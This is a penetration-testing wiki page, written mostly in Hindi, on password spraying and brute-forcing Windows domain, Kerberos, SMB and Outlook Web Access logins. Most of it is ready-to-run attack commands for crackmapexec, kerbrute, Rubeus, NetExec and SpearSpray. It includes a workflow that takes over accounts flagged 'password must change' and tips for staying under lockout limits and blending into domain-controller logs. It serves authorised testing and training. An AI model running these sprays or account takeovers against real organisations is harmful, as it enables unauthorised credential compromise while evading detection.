# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

एक बार जब आप कई **valid usernames** खोज लेते हैं, तो आप पाए गए प्रत्येक उपयोगकर्ता के साथ सबसे सामान्य **common passwords** आज़मा सकते हैं (पर्यावरण की **password policy** का ध्यान रखें).\
डिफ़ॉल्ट रूप से न्यूनतम **password** लंबाई **7** है।

सामान्य usernames की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि आप कुछ **accounts** को lockout कर सकते हैं यदि आप कई गलत **passwords** आज़माते हैं (डिफ़ॉल्ट रूप से 10 से अधिक)।

### Password policy प्राप्त करें

यदि आपके पास कुछ user credentials हैं या domain user के रूप में कोई shell है तो आप **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation from Linux (या सभी)

- **crackmapexec:** का उपयोग
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग - अनुशंसित नहीं, कभी-कभी काम नहीं करता
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit** के `scanner/smb/smb_login` मॉड्यूल के साथ:

![](<../../images/image (745).png>)

- **rpcclient** का उपयोग करके:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows से

- [Rubeus](https://github.com/Zer1t0/Rubeus) के brute module वाले संस्करण के साथ:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- के साथ [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को उत्पन्न कर सकता है और यह डोमेन से पासवर्ड पॉलिसी प्राप्त करेगा तथा उसके अनुसार प्रयासों को सीमित करेगा):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- के साथ [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### पहचानें और हथियाएँ "Password must change at next logon" Accounts (SAMR)

एक कम-शोर तकनीक यह है कि किसी benign/empty password पर spray करें और उन खातों को पकड़ें जो STATUS_PASSWORD_MUST_CHANGE लौटाते हैं, जो यह संकेत देता है कि पासवर्ड जबरन समाप्त कर दिया गया था और पुराने पासवर्ड को जाने बिना उसे बदला जा सकता है।

Workflow:
- Enumerate users (RID brute via SAMR) to build the target list:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password और hits पर आगे बढ़ते रहें ताकि उन accounts को capture किया जा सके जिन्हें next logon पर बदलना होगा:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- प्रत्येक हिट के लिए, NetExec’s मॉड्यूल के साथ SAMR पर पासवर्ड बदलें (जब "must change" सेट हो तो पुराने पासवर्ड की आवश्यकता नहीं होती):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
ऑपरेशनल नोट्स:
- Kerberos-based operations से पहले सुनिश्चित करें कि आपके होस्ट क्लॉक का समय DC के साथ सिंक में हो: `sudo ntpdate <dc_fqdn>`.
- कुछ मॉड्यूल्स में (उदा., RDP/WinRM) (Pwn3d!) के बिना एक [+] का मतलब है कि creds वैध हैं, लेकिन अकाउंट के पास interactive logon rights नहीं हैं।

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying SMB/NTLM/LDAP bind प्रयासों की तुलना में शोर कम करता है और AD lockout policies के साथ बेहतर संरेखण रखता है। SpearSpray LDAP-driven targeting, एक pattern engine, और policy awareness (domain policy + PSOs + badPwdCount buffer) को जोड़कर सटीक और सुरक्षित तरीके से spray करता है। यह compromised principals को Neo4j में tag भी कर सकता है ताकि BloodHound pathing संभव हो।

Key ideas:
- LDAP user discovery paging और LDAPS support के साथ, वैकल्पिक रूप से custom LDAP filters का उपयोग करते हुए।
- Domain lockout policy + PSO-aware filtering ताकि एक configurable attempt buffer (threshold) छोड़ा जा सके और users को lock होने से रोका जा सके।
- Kerberos pre-auth validation fast gssapi bindings का उपयोग करते हुए (DCs पर 4625 के बजाय 4768/4771 जनरेट करता है)।
- Pattern-based, प्रति-user password generation ऐसे variables का उपयोग करते हुए जैसे names और प्रत्येक user के pwdLastSet से निकले temporal values।
- Throughput control threads, jitter, और max requests per second के साथ।
- Optional Neo4j integration ताकि owned users को BloodHound के लिए mark किया जा सके।

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
लक्ष्य निर्धारण और पैटर्न नियंत्रण:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth और सुरक्षा नियंत्रण:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound समृद्धिकरण:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
पैटर्न सिस्टम का अवलोकन (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- प्रत्येक उपयोगकर्ता के pwdLastSet (या whenCreated) से समय-संबंधी: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- रचना सहायक और org token: {separator}, {suffix}, {extra}

Operational notes:
- सबसे अधिक अधिकारिक badPwdCount और नीति-संबंधी जानकारी पढ़ने के लिए PDC-emulator को -dc के साथ क्वेरी करना प्राथमिकता दें.
- badPwdCount रिसेट observation window के बाद अगली कोशिश पर ट्रिगर होते हैं; सुरक्षित रहने के लिए threshold और timing का उपयोग करें.
- Kerberos pre-auth प्रयास DC telemetry में 4768/4771 के रूप में दिखाई देते हैं; मिश्रित रहने के लिए jitter और rate-limiting का उपयोग करें.

> Tip: SpearSpray’s default LDAP page size is 200; आवश्यकता अनुसार -lps के साथ समायोजित करें.

## Outlook Web Access

p**assword spraying outlook** के लिए कई टूल्स हैं।

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

इनमें से किसी भी टूल का उपयोग करने के लिए, आपको एक user list और एक password / छोटी password सूची चाहिए जिन्हें spray करना है.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## संदर्भ

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
